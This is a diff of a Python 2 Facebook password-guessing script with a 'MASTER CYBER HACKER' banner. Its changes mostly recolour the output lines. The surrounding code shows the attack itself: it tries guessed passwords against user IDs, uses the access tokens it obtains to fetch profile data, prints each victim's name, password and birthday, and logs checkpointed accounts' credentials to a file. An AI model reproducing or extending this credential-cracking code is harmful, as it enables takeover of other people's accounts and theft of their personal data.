@@ -69,10 +69,10 @@ logo = """
                \033[1;91m︻╦デ╤╾━══════▶\33[1;33mCYBER\033[1;97m◀═════╾━╤デ╦︻
              \033[1;91m︻╦デ╤╾━══════▶\33[1;33mSUNDAWANI\033[1;97m◀═════╾━╤デ╦︻
                                                                                                                                                                                
-\033[37;1mAuthor   : MASTER CYBER HACKER
-\033[37;1mRecode   : IAN DEWA SULTAN PRAWIRA
-\033[37;1mGithub   : https://github.com/44k453p
-\033[37;1mFacebook : https://www.facebook.com/IANDEWASULTANPRAWIRA
+\033[37;1mAuthor   : \033[92mMASTER CYBER HACKER
+\033[37;1mRecode   : \033[92mIAN DEWA SULTAN PRAWIRA
+\033[37;1mGithub   : \033[92mhttps://github.com/44k453p
+\033[37;1mFacebook : \033[92mhttps://www.facebook.com/IANDEWASULTANPRAWIRA
 """
 
 def tik():
@@ -392,19 +392,19 @@ def pilih_indo():
 			if 'access_token' in w:
 				x = requests.get("https://graph.facebook.com/"+user+"?access_token="+w['access_token'])
 				z = json.loads(x.text)
-				print '\x1c\33[1;33m[✔] \x1c\33[1;33mBerhasil'
-				print '\x1c\33[1;33m[✴] \x1c\33[1;33mName \x1c\33[1;33m    : \x1c\33[1;33m' + c['name']
-				print '\x1c\33[1;33m[➹] \x1c\33[1;33mID \x1c\33[1;33m      : \x1c\33[1;33m' + user
-				print '\x1c\33[1;33m[➹] \x1c\33[1;33mPassword \x1c\33[1;33m: \x1c\33[1;33m' + pass1 + '\n'
-				print '\x1c\33[1;33m[➹] \x1c\33[1;33mTanggal Lahir \x1c\33[1;33m: \x1c\33[1;33m' + c['birthday']
+				print '\x1c\033[1;97m[\033[1;91m✔\033[1;97m] \x1c\33[1;33mBerhasil'
+				print '\x1c\033[1;97m[\033[1;91m✴\033[1;97m] \x1c\33[1;33mName \x1c\033[1;91m    : \x1c\33[1;33m' + c['name']
+				print '\x1c\033[1;97m[\033[1;91m➹\033[1;97m] \x1c\33[1;33mID \x1c\033[1;91m      : \x1c\33[1;33m' + user
+				print '\x1c\033[1;97m[\033[1;91m➹\033[1;97m] \x1c\33[1;33mPassword \x1c\033[1;91m: \x1c\33[1;33m' + pass1 + '\n'
+				print '\x1c\033[1;97m[\033[1;91m➹\033[1;97m] \x1c\33[1;33mTanggal Lahir \x1c\033[1;91m: \x1c\33[1;33m' + c['birthday']
 				oks.append(user+pass1)
 			else:
 				if 'www.facebook.com' in w['error_msg']:
-					print '\x1c\033[1;94m[✖] \x1c\033[1;94mCheckpoint'
-					print '\x1c\033[1;94m[✴] \x1c\033[1;94mName \x1c\033[1;94m    : \x1c\033[1;95m' + c['name']
-					print '\x1c\033[1;94m[➹] \x1c\033[1;94mID \x1c\033[1;94m      : \x1c\033[1;95m' + user
-					print '\x1c\033[1;94m[➹] \x1c\033[1;94mPassword \x1c\033[1;94m: \x1c\033[1;95m' + pass1 + '\n'
-					print '\x1c\033[1;97m[➹] \x1c\033[1;91mTanggal Lahir \x1c\033[1;91m: \x1c\033[1;92m' + c['birthday']
+					print '\x1c\033[1;97m[\033[1;91m✖\033[1;97m] \x1c\33[1;33mCheckpoint'
+					print '\x1c\033[1;97m[\033[1;91m✴\033[1;97m] \x1c\33[1;33mName \x1c\033[1;91m    : \x1c\33[1;33m' + c['name']
+					print '\x1c\033[1;97m[\033[1;91m➹\033[1;97m] \x1c\33[1;33mID \x1c\033[1;91m      : \x1c\33[1;33m' + user
+					print '\x1c\033[1;97m[\033[1;91m➹\033[1;97m] \x1c\33[1;33mPassword \x1c\033[1;91m: \x1c\33[1;33m' + pass1 + '\n'
+					print '\x1c\033[1;97m[\033[1;91m➹\033[1;97m] \x1c\33[1;33mTanggal Lahir \x1c\033[1;91m: \x1c\33[1;33m' + c['birthday']
 					cek = open("out/super_cp.txt", "a")
 					cek.write("ID:" +user+ " Pw:" +pass1+"\n")
 					cek.close()
@@ -416,19 +416,19 @@ def pilih_indo():
 					if 'access_token' in w:
 						x = requests.get("https://graph.facebook.com/"+user+"?access_token="+w['access_token'])
 						z = json.loads(x.text)
-						print '\x1c\033[1;94m[✔] \x1c\033[1;92mBerhasil'
-						print '\x1c\033[1;94m[✴] \x1c\033[1;91mName \x1c\033[1;91m    : \x1c\033[1;92m' + c['name']
-						print '\x1c\033[1;94m[➹] \x1c\033[1;91mID \x1c\033[1;91m      : \x1c\033[1;92m' + user
-						print '\x1c\033[1;94m[➹] \x1c\033[1;91mPassword \x1c\033[1;91m: \x1c\033[1;92m' + pass2 + '\n'
-						print '\x1c\033[1;97m[➹] \x1c\033[1;91mTanggal Lahir \x1c\033[1;91m: \x1c\033[1;92m' + c['birthday']
+						print '\x1c\033[1;97m[\033[1;91m✔\033[1;97m] \x1c\33[1;33mBerhasil'
+						print '\x1c\033[1;97m[\033[1;91m✴\033[1;97m] \x1c\33[1;33mName \x1c\033[1;91m    : \x1c\33[1;33m' + c['name']
+						print '\x1c\033[1;97m[\033[1;91m➹\033[1;97m] \x1c\33[1;33mID \x1c\033[1;91m      : \x1c\33[1;33m' + user
+						print '\x1c\033[1;97m[\033[1;91m➹\033[1;97m] \x1c\33[1;33mPassword \x1c\033[1;91m: \x1c\33[1;33m' + pass2 + '\n'
+						print '\x1c\033[1;97m[\033[1;91m➹\033[1;97m] \x1c\33[1;33mTanggal Lahir \x1c\033[1;91m: \x1c\33[1;33m' + c['birthday']
 						oks.append(user+pass2)
 					else:
 						if 'www.facebook.com' in w['error_msg']:
-							print '\x1c\033[1;94m[✖] \x1c\033[1;94mCheckpoint'
-							print '\x1c\033[1;94m[✴] \x1c\033[1;94mName \x1c\033[1;94m    : \x1c\033[1;95m' + c['name']
-							print '\x1c\033[1;94m[➹] \x1c\033[1;94mID \x1c\033[1;94m      : \x1c\033[1;95m' + user
-							print '\x1c\033[1;94m[➹] \x1c\033[1;94mPassword \x1c\033[1;94m: \x1c\033[1;95m' + pass2 + '\n'
-							print '\x1c\033[1;97m[➹] \x1c\033[1;91mTanggal Lahir \x1c\033[1;91m: \x1c\033[1;92m' + c['birthday']
+							print '\x1c\033[1;97m[\033[1;91m✖\033[1;97m] \x1c\33[1;33mCheckpoint'
+							print '\x1c\033[1;97m[\033[1;91m✴\033[1;97m] \x1c\33[1;33mName \x1c\033[1;91m    : \x1c\33[1;33m' + c['name']
+							print '\x1c\033[1;97m[\033[1;91m➹\033[1;97m] \x1c\33[1;33mID \x1c\033[1;91m      : \x1c\33[1;33m' + user
+							print '\x1c\033[1;97m[\033[1;91m➹\033[1;97m] \x1c\33[1;33mPassword \x1c\033[1;91m: \x1c\33[1;33m' + pass2 + '\n'
+							print '\x1c\033[1;97m[\033[1;91m➹\033[1;97m] \x1c\\33[1;33mTanggal Lahir \x1c\033[1;91m: \x1c\33[1;33m' + c['birthday']
 							cek = open("out/super_cp.txt", "a")
 							cek.write("ID:" +user+ " Pw:" +pass2+"\n")
 							cek.close()
@@ -440,19 +440,19 @@ def pilih_indo():
 							if 'access_token' in w:
 								x = requests.get("https://graph.facebook.com/"+user+"?access_token="+w['access_token'])
 								z = json.loads(x.text)
-								print '\x1c\033[1;94m[✔] \x1c\033[1;92mBerhasil'
-								print '\x1c\033[1;94m[✴] \x1c\033[1;91mName \x1c\033[1;91m    : \x1c\033[1;92m' + c['name']
-								print '\x1c\033[1;94m[➹] \x1c\033[1;91mID \x1c\033[1;91m      : \x1c\033[1;92m' + user
-								print '\x1c\033[1;94m[➹] \x1c\033[1;91mPassword \x1c\033[1;91m: \x1c\033[1;92m' + pass3 + '\n'
-								print '\x1c\033[1;97m[➹] \x1c\033[1;91mTanggal Lahir \x1c\033[1;91m: \x1c\033[1;92m' + c['birthday']
+								print '\x1c\033[1;94m[\033[1;91m✔\033[1;97m] \x1c\33[1;33mBerhasil'
+								print '\x1c\033[1;97m[\033[1;91m✴\033[1;97m] \x1c\33[1;33mName \x1c\033[1;91m    : \x1c\33[1;33m' + c['name']
+								print '\x1c\033[1;97m[\033[1;91m➹\033[1;97m] \x1c\33[1;33mID \x1c\033[1;91m      : \x1c\33[1;33m' + user
+								print '\x1c\033[1;97m[\033[1;91m➹\033[1;97m] \x1c\33[1;33mPassword \x1c\033[1;91m: \x1c\33[1;33m' + pass3 + '\n'
+								print '\x1c\033[1;97m[\033[1;91m➹\033[1;97m] \x1c\33[1;33mTanggal Lahir \x1c\033[1;91m: \x1c\33[1;33m' + c['birthday']
 								oks.append(user+pass3)
 							else:
 								if 'www.facebook.com' in w['error_msg']:
-									print '\x1c\033[1;94m[✖] \x1c\033[1;94mCheckpoint'
-									print '\x1c\033[1;94m[✴] \x1c\033[1;94mName \x1c\033[1;94m    : \x1c\033[1;95m' + c['name']
-									print '\x1c\033[1;94m[➹] \x1c\033[1;94mID \x1c\033[1;94m      : \x1c\033[1;95m' + user
-									print '\x1c\033[1;94m[➹] \x1c\033[1;94mPassword \x1c\033[1;94m: \x1c\033[1;95m' + pass3 + '\n'
-									print '\x1c\033[1;97m[➹] \x1c\033[1;91mTanggal Lahir \x1c\033[1;91m: \x1c\033[1;92m' + c['birthday']
+									print '\x1c\033[1;97m[\033[1;91m✖\033[1;97m] \x1c\33[1;33mCheckpoint'
+									print '\x1c\033[1;97m[\033[1;91m✴\033[1;97m] \x1c\33[1;33mName \x1c\033[1;91m    : \x1c\33[1;33m' + c['name']
+									print '\x1c\033[1;97m[\033[1;91m➹\033[1;97m] \x1c\33[1;33mID \x1c\033[1;91m      : \x1c\33[1;33m' + user
+									print '\x1c\033[1;97m[\033[1;91m➹\033[1;97m] \x1c\33[1;33mPassword \x1c\033[1;91m: \x1c\33[1;33m' + pass3 + '\n'
+									print '\x1c\033[1;97m[\033[1;91m➹\033[1;97m] \x1c\33[1;33mTanggal Lahir \x1c\033[1;91m: \x1c\33[1;33m' + c['birthday']
 									cek = open("out/super_cp.txt", "a")
 									cek.write("ID:" +user+ " Pw:" +pass3+"\n")
 									cek.close()
@@ -464,19 +464,19 @@ def pilih_indo():
 									if 'access_token' in w:
 										x = requests.get("https://graph.facebook.com/"+user+"?access_token="+w['access_token'])
 										z = json.loads(x.text)
-										print '\x1c\033[1;94m[✔] \x1c\033[1;92mBerhasil'
-										print '\x1c\033[1;94m[✴] \x1c\033[1;91mName \x1c\033[1;91m    : \x1c\033[1;92m' + c['name']
-										print '\x1c\033[1;94m[➹] \x1c\033[1;91mID \x1c\033[1;91m      : \x1c\033[1;92m' + user
-										print '\x1c\033[1;94m[➹] \x1c\033[1;94mPassword \x1c\033[1;94m: \x1c\033[1;95m' + pass4 + '\n'
-										print '\x1c\033[1;97m[➹] \x1c\033[1;91mTanggal Lahir \x1c\033[1;91m: \x1c\033[1;92m' + c['birthday']
+										print '\x1c\033[1;97m[\033[1;91m✔\033[1;97m] \x1c\033[1;33mBerhasil'
+										print '\x1c\033[1;97m[\033[1;91m✴\033[1;97m] \x1c\033[1;93mName \x1c\033[1;91m    : \x1c\033[1;33m' + c['name']
+										print '\x1c\033[1;97m[\033[1;91m➹\033[1;97m] \x1c\033[1;93mID \x1c\033[1;91m      : \x1c\033[1;33m' + user
+										print '\x1c\033[1;97m[\033[1;91m➹\033[1;97m] \x1c\033[1;93mPassword \x1c\033[1;91m: \x1c\033[1;33m' + pass4 + '\n'
+										print '\x1c\033[1;97m[\033[1;91m➹\033[1;97m] \x1c\033[1;93mTanggal Lahir \x1c\033[1;91m: \x1c\033[1;33m' + c['birthday']
 										oks.append(user+pass4)
 									else:
 										if 'www.facebook.com' in w['error_msg']:
-											print '\x1c\033[1;94m[✖] \x1c\033[1;94mCheckpoint'
-											print '\x1c\033[1;94m[✴] \x1c\033[1;94mName \x1c\033[1;94m    : \x1c\033[1;95m' + c['name']
-											print '\x1c\033[1;94m[➹] \x1c\033[1;94mID \x1c\033[1;94m      : \x1c\033[1;95m' + user
-											print '\x1c\033[1;94m[➹] \x1c\033[1;94mPassword \x1c\033[1;94m: \x1c\033[1;95m' + pass4 + '\n'
-											print '\x1c\033[1;97m[➹] \x1c\033[1;91mTanggal Lahir \x1c\033[1;91m: \x1c\033[1;92m' + c['birthday']
+											print '\x1c\033[1;97m[\033[1;91m✖\033[1;97m] \x1c\033[1;33mCheckpoint'
+											print '\x1c\033[1;97m[\033[1;91m✴\033[1;97m] \x1c\033[1;33mName \x1c\033[1;91m    : \x1c\033[1;33m' + c['name']
+											print '\x1c\033[1;97m[\033[1;91m➹\033[1;97m] \x1c\033[1;33mID \x1c\033[1;91m      : \x1c\033[1;33m' + user
+											print '\x1c\033[1;97m[\033[1;91m➹\033[1;97m] \x1c\033[1;33mPassword \x1c\033[1;91m: \x1c\033[1;33m' + pass4 + '\n'
+											print '\x1c\033[1;97m[\033[1;91m➹\033[1;97m] \x1c\033[1;33mTanggal Lahir \x1c\033[1;91m: \x1c\033[1;33m' + c['birthday']
 											cek = open("out/super_cp.txt", "a")
 											cek.write("ID:" +user+ " Pw:" +pass4+"\n")
 											cek.close()
@@ -488,19 +488,19 @@ def pilih_indo():
 											if 'access_token' in w:
 												x = requests.get("https://graph.facebook.com/"+user+"?access_token="+w['access_token'])
 												z = json.loads(x.text)
-												print '\x1c\033[1;94m[✔] \x1c\033[1;92mBerhasil'
-												print '\x1c\033[1;94m[✴] \x1c\033[1;91mName \x1c\033[1;91m    : \x1c\033[1;92m' + c['name']
-												print '\x1c\033[1;94m[➹] \x1c\033[1;91mID \x1c\033[1;91m      : \x1c\033[1;92m' + user
-												print '\x1c\033[1;94m[➹] \x1c\033[1;94mPassword \x1c\033[1;94m: \x1c\033[1;95m' + pass5 + '\n'
-												print '\x1c\033[1;97m[➹] \x1c\033[1;91mTanggal Lahir \x1c\033[1;91m: \x1c\033[1;92m' + c['birthday']
+												print '\x1c\033[1;97m[\033[1;91m✔\033[1;97m] \x1c\033[1;33mBerhasil'
+												print '\x1c\033[1;97m[\033[1;91m✴\033[1;97m] \x1c\033[1;33mName \x1c\033[1;91m    : \x1c\033[1;33m' + c['name']
+												print '\x1c\033[1;97m[\033[1;91m➹\033[1;97m] \x1c\033[1;33mID \x1c\033[1;91m      : \x1c\033[1;33m' + user
+												print '\x1c\033[1;97m[\033[1;91m➹\033[1;97m] \x1c\033[1;33mPassword \x1c\033[1;91m: \x1c\033[1;33m' + pass5 + '\n'
+												print '\x1c\033[1;97m[\033[1;91m➹\033[1;97m] \x1c\033[1;33mTanggal Lahir \x1c\033[1;91m: \x1c\033[1;33m' + c['birthday']
 												oks.append(user+pass5)
 											else:
 												if 'www.facebook.com' in w['error_msg']:
-													print '\x1c\033[1;94m[✖] \x1c\033[1;94mCheckpoint'
-													print '\x1c\033[1;94m[✴] \x1c\033[1;94mName \x1c\033[1;94m    : \x1c\033[1;95m' + c['name']
-													print '\x1c\033[1;94m[➹] \x1c\033[1;94mID \x1c\033[1;94m      : \x1c\033[1;95m' + user
-													print '\x1c\033[1;94m[➹] \x1c\033[1;94mPassword \x1c\033[1;94m: \x1c\033[1;95m' + pass5 + '\n'
-													print '\x1c\033[1;97m[➹] \x1c\033[1;91mTanggal Lahir \x1c\033[1;91m: \x1c\033[1;92m' + c['birthday']
+													print '\x1c\033[1;97m[\033[1;91m✖\033[1;97m] \x1c\033[1;33mCheckpoint'
+													print '\x1c\033[1;97m[\033[1;91m✴\033[1;97m] \x1c\033[1;33mName \x1c\033[1;91m    : \x1c\033[1;33m' + c['name']
+													print '\x1c\033[1;97m[\033[1;91m➹\033[1;97m] \x1c\033[1;33mID \x1c\033[1;91m      : \x1c\033[1;33m' + user
+													print '\x1c\033[1;97m[\033[1;91m➹\033[1;97m] \x1c\033[1;33mPassword \x1c\033[1;91m: \x1c\033[1;33m' + pass5 + '\n'
+													print '\x1c\033[1;97m[\033[1;91m➹\033[1;97m] \x1c\033[1;33mTanggal Lahir \x1c\033[1;91m: \x1c\033[1;33m' + c['birthday']
 													cek = open("out/super_cp.txt", "a")
 													cek.write("ID:" +user+ " Pw:" +pass5+"\n")
 													cek.close()
@@ -512,19 +512,19 @@ def pilih_indo():
 													if 'access_token' in w:
 														x = requests.get("https://graph.facebook.com/"+user+"?access_token="+w['access_token'])
 														z = json.loads(x.text)
-														print '\x1c\033[1;94m[✔] \x1c\033[1;92mBerhasil'
-														print '\x1c\033[1;94m[✴] \x1c\033[1;91mName \x1c\033[1;91m    : \x1c\033[1;92m' + c['name']
-														print '\x1c\033[1;94m[➹] \x1c\033[1;91mID \x1c\033[1;91m      : \x1c\033[1;92m' + user
-														print '\x1c\033[1;94m[➹] \x1c\033[1;94mPassword \x1c\033[1;94m: \x1c\033[1;95m' + pass6 + '\n'
-														print '\x1c\033[1;97m[➹] \x1c\033[1;91mTanggal Lahir \x1c\033[1;91m: \x1c\033[1;92m' + c['birthday']
+														print '\x1c\033[1;97m[\033[1;91m✔\033[1;97m] \x1c\033[1;33mBerhasil'
+														print '\x1c\033[1;97m[\033[1;91m✴\033[1;97m] \x1c\033[1;33mName \x1c\033[1;91m    : \x1c\033[1;33m' + c['name']
+														print '\x1c\033[1;97m[\033[1;91m➹\033[1;97m] \x1c\033[1;33mID \x1c\033[1;91m      : \x1c\033[1;33m' + user
+														print '\x1c\033[1;97m[\033[1;91m➹\033[1;97m] \x1c\033[1;33mPassword \x1c\033[1;91m: \x1c\033[1;33m' + pass6 + '\n'
+														print '\x1c\033[1;97m[\033[1;91m➹\033[1;97m] \x1c\033[1;33mTanggal Lahir \x1c\033[1;91m: \x1c\033[1;33m' + c['birthday']
 														oks.append(user+pass6)
 													else:
 														if 'www.facebook.com' in w['error_msg']:
-															print '\x1c\033[1;94m[✖] \x1c\033[1;94mCheckpoint'
-															print '\x1c\033[1;94m[✴] \x1c\033[1;94mName \x1c\033[1;94m    : \x1c\033[1;95m' + c['name']
-															print '\x1c\033[1;94m[➹] \x1c\033[1;94mID \x1c\033[1;94m      : \x1c\033[1;95m' + user
-															print '\x1c\033[1;94m[➹] \x1c\033[1;94mPassword \x1c\033[1;94m: \x1c\033[1;95m' + pass6 + '\n'
-															print '\x1c\033[1;97m[➹] \x1c\033[1;91mTanggal Lahir \x1c\033[1;91m: \x1c\033[1;92m' + c['birthday']
+															print '\x1c\033[1;97m[\033[1;91m✖\033[1;97m] \x1c\033[1;33mCheckpoint'
+															print '\x1c\033[1;97m[\033[1;91m✴\033[1;97m] \x1c\033[1;33mName \x1c\033[1;91m    : \x1c\033[1;33m' + c['name']
+															print '\x1c\033[1;97m[\033[1;91m➹\033[1;97m] \x1c\033[1;33mID \x1c\033[1;91m      : \x1c\033[1;33m' + user
+															print '\x1c\033[1;97m[\033[1;91m➹\033[1;97m] \x1c\033[1;33mPassword \x1c\033[1;91m: \x1c\033[1;33m' + pass6 + '\n'
+															print '\x1c\033[1;97m[\033[1;91m➹\033[1;97m] \x1c\033[1;33mTanggal Lahir \x1c\033[1;91m: \x1c\033[1;33m' + c['birthday']
 															cek = open("out/super_cp.txt", "a")
 															cek.write("ID:" +user+ " Pw:" +pass6+"\n")
 															cek.close()
@@ -536,19 +536,19 @@ def pilih_indo():
 															if 'access_token' in w:
 																x = requests.get("https://graph.facebook.com/"+user+"?access_token="+w['access_token'])
 																z = json.loads(x.text)
-																print '\x1c\033[1;94m[✔] \x1c\033[1;92mBerhasil'
-																print '\x1c\033[1;94m[✴] \x1c\033[1;91mName \x1c\033[1;91m    : \x1c\033[1;92m' + c['name']
-																print '\x1c\033[1;94m[➹] \x1c\033[1;94mID \x1c\033[1;94m      : \x1c\033[1;95m' + user
-																print '\x1c\033[1;94m[➹] \x1c\033[1;94mPassword \x1c\033[1;94m: \x1c\033[1;95m' + pass7 + '\n'
-																print '\x1c\033[1;97m[➹] \x1c\033[1;91mTanggal Lahir \x1c\033[1;91m: \x1c\033[1;92m' + c['birthday']
+																print '\x1c\033[1;97m[\033[1;91m✔\033[1;97m] \x1c\033[1;33mBerhasil'
+																print '\x1c\033[1;97m[\033[1;91m✴\033[1;97m] \x1c\033[1;33mName \x1c\033[1;91m    : \x1c\033[1;33m' + c['name']
+																print '\x1c\033[1;97m[\033[1;91m➹\033[1;97m] \x1c\033[1;33mID \x1c\033[1;91m     : \x1c\033[1;33m' + user
+																print '\x1c\033[1;97m[\033[1;91m➹\033[1;97m] \x1c\033[1;33mPassword \x1c\033[1;91m: \x1c\033[1;33m' + pass7 + '\n'
+																print '\x1c\033[1;97m[\033[1;91m➹\033[1;97m] \x1c\033[1;33mTanggal Lahir \x1c\033[1;91m: \x1c\033[1;33m' + c['birthday']
 																oks.append(user+pass7)
 															else:
 																if 'www.facebook.com' in w['error_msg']:
-																	print '\x1c\033[1;94m[✖] \x1c\033[1;94mCheckpoint'
-																	print '\x1c\033[1;94m[✴] \x1c\033[1;94mName \x1c\033[1;94m    : \x1c\033[1;95m' + c['name']
-																	print '\x1c\033[1;94m[➹] \x1c\033[1;94mID \x1c\033[1;94m      : \x1c\033[1;95m' + user
-																	print '\x1c\033[1;94m[➹] \x1c\033[1;94mPassword \x1c\033[1;94m: \x1c\033[1;95m' + pass7 + '\n'
-																	print '\x1c\033[1;97m[➹] \x1c\033[1;91mTanggal Lahir \x1c\033[1;91m: \x1c\033[1;92m' + c['birthday']
+																	print '\x1c\033[1;97m[\033[1;91m✖\033[1;97m] \x1c\033[1;33mCheckpoint'
+																	print '\x1c\033[1;97m[\033[1;91m✴\033[1;97m] \x1c\033[1;33mName \x1c\033[1;91m    : \x1c\033[1;33m' + c['name']
+																	print '\x1c\033[1;97m[\033[1;91m➹\033[1;97m] \x1c\033[1;33mID \x1c\033[1;91m      : \x1c\033[1;33m' + user
+																	print '\x1c\033[1;97m[\033[1;91m➹\033[1;97m] \x1c\033[1;33mPassword \x1c\033[1;91m: \x1c\033[1;33m' + pass7 + '\n'
+																	print '\x1c\033[1;97m[\033[1;91m➹\033[1;97m] \x1c\033[1;33mTanggal Lahir \x1c\033[1;91m: \x1c\033[1;33m' + c['birthday']
 																	cek = open("out/super_cp.txt", "a")
 																	cek.write("ID:" +user+ " Pw:" +pass7+"\n")
 																	cek.close()
@@ -560,19 +560,19 @@ def pilih_indo():
 																	if 'access_token' in w:
 																		x = requests.get("https://graph.facebook.com/"+user+"?access_token="+w['access_token'])
 																		z = json.loads(x.text)
-																		print '\x1c\033[1;94m[✔] \x1c\033[1;92mBerhasil'
-																		print '\x1c\033[1;94m[✴] \x1c\033[1;91mName \x1c\033[1;91m    : \x1c\033[1;92m' + c['name']
-																		print '\x1c\033[1;94m[➹] \x1c\033[1;94mID \x1c\033[1;94m      : \x1c\033[1;95m' + user
-																		print '\x1c\033[1;94m[➹] \x1c\033[1;94mPassword \x1c\033[1;94m: \x1c\033[1;95m' + pass8 + '\n'
-																		print '\x1c\033[1;97m[➹] \x1c\033[1;91mTanggal Lahir \x1c\033[1;91m: \x1c\033[1;92m' + c['birthday']
+																		print '\x1c\033[1;97m[\033[1;91m✔\033[1;97m] \x1c\033[1;33mBerhasil'
+																		print '\x1c\033[1;97m[\033[1;91m✴\033[1;97m] \x1c\033[1;33mName \x1c\033[1;91m    : \x1c\033[1;33m' + c['name']
+																		print '\x1c\033[1;97m[\033[1;91m➹\033[1;97m] \x1c\033[1;33mID \x1c\033[1;91m      : \x1c\033[1;33m' + user
+																		print '\x1c\033[1;97m[\033[1;91m➹\033[1;97m] \x1c\033[1;33mPassword \x1c\033[1;91m: \x1c\033[1;33m' + pass8 + '\n'
+																		print '\x1c\033[1;97m[\033[1;91m➹\033[1;97m] \x1c\033[1;33mTanggal Lahir \x1c\033[1;91m: \x1c\033[1;33m' + c['birthday']
 																		oks.append(user+pass8)
 																	else:
 																		if 'www.facebook.com' in w['error_msg']:
-																			print '\x1c\033[1;94m[✖] \x1c\033[1;94mCheckpoint'
-																			print '\x1c\033[1;94m[✴] \x1c\033[1;94mName \x1c\033[1;94m    : \x1c\033[1;95m' + c['name']
-																			print '\x1c\033[1;94m[➹] \x1c\033[1;94mID \x1c\033[1;94m      : \x1c\033[1;95m' + user
-																			print '\x1c\033[1;94m[➹] \x1c\033[1;94mPassword \x1c\033[1;94m: \x1c\033[1;95m' + pass8 + '\n'
-																			print '\x1c\033[1;97m[➹] \x1c\033[1;91mTanggal Lahir \x1c\033[1;91m: \x1c\033[1;92m' + c['birthday']
+																			print '\x1c\033[1;97m[\033[1;91m✖\033[1;97m] \x1c\033[1;33mCheckpoint'
+																			print '\x1c\033[1;97m[\033[1;91m✴\033[1;97m] \x1c\033[1;33mName \x1c\033[1;91m    : \x1c\033[1;33m' + c['name']
+																			print '\x1c\033[1;97m[\033[1;91m➹\033[1;97m] \x1c\033[1;33mID \x1c\033[1;91m      : \x1c\033[1;33m' + user
+																			print '\x1c\033[1;97m[\033[1;91m➹\033[1;97m] \x1c\033[1;33mPassword \x1c\033[1;91m: \x1c\033[1;33m' + pass8 + '\n'
+																			print '\x1c\033[1;97m[\033[1;91m➹\033[1;97m] \x1c\033[1;33mTanggal Lahir \x1c\033[1;91m: \x1c\033[1;33m' + c['birthday']
 																			cek = open("out/super_cp.txt", "a")
 																			cek.write("ID:" +user+ " Pw:" +pass8+"\n")
 																			cek.close()
@@ -584,19 +584,19 @@ def pilih_indo():
 																				if 'access_token' in w:
 																					x = requests.get("https://graph.facebook.com/"+user+"?access_token="+w['access_token'])
 																					z = json.loads(x.text)
-																					print '\x1c\033[1;94m[✔] \x1c\033[1;92mBerhasil'
-																					print '\x1c\033[1;94m[✴] \x1c\033[1;91mName \x1c\033[1;91m    : \x1c\033[1;92m' + c['name']
-																					print '\x1c\033[1;94m[➹] \x1c\033[1;94mID \x1c\033[1;94m      : \x1c\033[1;95m' + user
-																					print '\x1c\033[1;94m[➹] \x1c\033[1;94mPassword \x1c\033[1;94m: \x1c\033[1;95m' + pass9 + '\n'
-																					print '\x1c\033[1;97m[➹] \x1c\033[1;91mTanggal Lahir \x1c\033[1;91m: \x1c\033[1;92m' + c['birthday']
+																					print '\x1c\033[1;97m[\033[1;91m✔\033[1;97m] \x1c\033[1;33mBerhasil'
+																					print '\x1c\033[1;97m[\033[1;91m✴\033[1;97m] \x1c\033[1;33mName \x1c\033[1;91m    : \x1c\033[1;33m' + c['name']
+																					print '\x1c\033[1;97m[\033[1;91m➹\033[1;97m] \x1c\033[1;33mID \x1c\033[1;91m      : \x1c\033[1;33m' + user
+																					print '\x1c\033[1;97m[\033[1;91m➹\033[1;97m] \x1c\033[1;33mPassword \x1c\033[1;91m: \x1c\033[1;33m' + pass9 + '\n'
+																					print '\x1c\033[1;97m[\033[1;91m➹\033[1;97m] \x1c\033[1;33mTanggal Lahir \x1c\033[1;91m: \x1c\033[1;33m' + c['birthday']
 																					oks.append(user+pass9)
 																				else:
 																					if 'www.facebook.com' in w['error_msg']:
-																						print '\x1c\033[1;94m[✖] \x1c\033[1;94mCheckpoint'
-																						print '\x1c\033[1;94m[✴] \x1c\033[1;94mName \x1c\033[1;94m    : \x1c\033[1;95m' + c['name']
-																						print '\x1c\033[1;94m[➹] \x1c\033[1;94mID \x1c\033[1;94m      : \x1c\033[1;95m' + user
-																						print '\x1c\033[1;94m[➹] \x1c\033[1;94mPassword \x1c\033[1;94m: \x1c\033[1;95m' + pass9 + '\n'
-																						print '\x1c\033[1;97m[➹] \x1c\033[1;91mTanggal Lahir \x1c\033[1;91m: \x1c\033[1;92m' + c['birthday']
+																						print '\x1c\033[1;97m[\033[1;91m✖\033[1;97m] \x1c\033[1;33mCheckpoint'
+																						print '\x1c\033[1;97m[\033[1;91m✴\033[1;97m] \x1c\033[1;33mName \x1c\033[1;91m    : \x1c\033[1;33m' + c['name']
+																						print '\x1c\033[1;97m[\033[1;91m➹\033[1;97m] \x1c\033[1;33mID \x1c\033[1;91m      : \x1c\033[1;33m' + user
+																						print '\x1c\033[1;97m[\033[1;91m➹\033[1;97m] \x1c\033[1;33mPassword \x1c\033[1;91m: \x1c\033[1;33m' + pass9 + '\n'
+																						print '\x1c\033[1;97m[\033[1;91m➹\033[1;97m] \x1c\033[1;33mTanggal Lahir \x1c\033[1;91m: \x1c\033[1;33m' + c['birthday']
 																						cek = open("out/super_cp.txt", "a")
 																						cek.write("ID:" +user+ " Pw:" +pass9+"\n")
 																						cek.close()
@@ -608,19 +608,19 @@ def pilih_indo():
 																						if 'access_token' in w:
 																							x = requests.get("https://graph.facebook.com/"+user+"?access_token="+w['access_token'])
 																							z = json.loads(x.text)
-																							print '\x1c\033[1;94m[✔] \x1c\033[1;92mBerhasil'
-																							print '\x1c\033[1;94m[✴] \x1c\033[1;91mName \x1c\033[1;91m    : \x1c\033[1;92m' + c['name']
-																							print '\x1c\033[1;94m[➹] \x1c\033[1;94mID \x1c\033[1;94m      : \x1c\033[1;95m' + user
-																							print '\x1c\033[1;94m[➹] \x1c\033[1;94mPassword \x1c\033[1;94m: \x1c\033[1;95m' + pass10 + '\n'
-																							print '\x1c\033[1;97m[➹] \x1c\033[1;91mTanggal Lahir \x1c\033[1;91m: \x1c\033[1;92m' + c['birthday']
+																							print '\x1c\033[1;97m[\033[1;91m✔\033[1;97m] \x1c\033[1;33mBerhasil'
+																							print '\x1c\033[1;97m[\033[1;91m✴\033[1;97m] \x1c\033[1;33mName \x1c\033[1;91m    : \x1c\033[1;33m' + c['name']
+																							print '\x1c\033[1;97m[\033[1;91m➹\033[1;97m] \x1c\033[1;33mID \x1c\033[1;91m      : \x1c\033[1;33m' + user
+																							print '\x1c\033[1;97m[\033[1;91m➹\033[1;97m] \x1c\033[1;33mPassword \x1c\033[1;91m: \x1c\033[1;33m' + pass10 + '\n'
+																							print '\x1c\033[1;97m[\033[1;91m➹\033[1;97m] \x1c\033[1;33mTanggal Lahir \x1c\033[1;91m: \x1c\033[1;33m' + c['birthday']
 																							oks.append(user+pass10)
 																						else:
 																							if 'www.facebook.com' in w['error_msg']:
